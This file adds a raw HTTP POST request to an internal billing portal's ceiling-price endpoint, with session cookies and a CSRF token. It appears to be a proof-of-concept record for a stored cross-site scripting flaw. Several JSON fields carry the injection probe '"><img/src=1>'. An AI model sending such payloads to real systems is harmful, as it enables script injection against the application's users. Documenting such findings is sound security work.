@@ -1,0 +1,10 @@
+POST /portal-web/otc/cellingPrice/addCellingPrice HTTP/1.1
+Host: 10.10.177.111
+Cookie: isLocked=false; staffJobId=25162; ZSMART_LOCALE=en; SP_ID=0; areaId=100; orgId=100; userId=1; HTML_VERSION=1794653129366; SESSION=6b0994c6-1d9d-4bf6-a16b-31c4c9398828
+Content-Length: 803
+X-Csrf-Token: 1e5cd9c5-7da5-4ecf-a4e4-312f1a8fb294
+Menu-Id: 120011
+X-Requested-With: XMLHttpRequest
+Content-Type: application/json
+
+{"acctItemTypeId":1,"priority":"1","otcConGroupDto":{"conGroupName":"(getAttrValue(Customer Feature:testDiana) In \"><img/src=1> ) ","conGroupExpression":"({})","otcConDtoList":[{"conName":"getAttrValue(Customer Feature:testDiana) In \"><img/src=1>","operator":5,"otcConLeft":{"conName":"getAttrValue(Customer Feature:testDiana)","lParam1":"testDiana","factorId":60,"funId":65},"otcConRight":{"conName":"\"><img/src=1>","conType":"B","value":"\"><img/src=1>"}}],"conExpDto":{"conList":[{"conLeftDto":{"conLeftId":65,"conName":"getAttrValue(Customer Feature:testDiana)","funId":65,"lParam1":"testDiana","factorId":60}},"conRightDto":{"conRightId":65,"conName":"\"><img/src=1>","value":"\"><img/src=1>","conType":"B"},"operator":5}],"falg":false},"cellPrice":"100"}
